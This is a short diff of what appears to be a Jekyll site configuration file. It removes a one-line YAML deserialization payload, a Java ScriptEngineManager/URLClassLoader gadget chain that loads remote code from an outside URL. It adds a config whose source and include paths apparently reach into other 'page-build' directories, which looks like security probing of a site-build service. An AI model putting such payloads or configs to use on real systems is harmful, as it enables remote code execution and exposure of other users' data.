@@ -1,1 +1,14 @@
-!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://antoniosanso.appspot.com/lol\"]]]]
+source: /page-build/repo2
+include:
+  - page-build/site-source-pagesjekyll-ftw
+  - _config.yml
+  - page-build/repo
+plugins:
+  - jekyll-redirect-from
+  - jekyll-sitemap
+defaults:
+  -
+    scope:
+      path:            "**/*.*"
+    values:
+      sitemap:         true
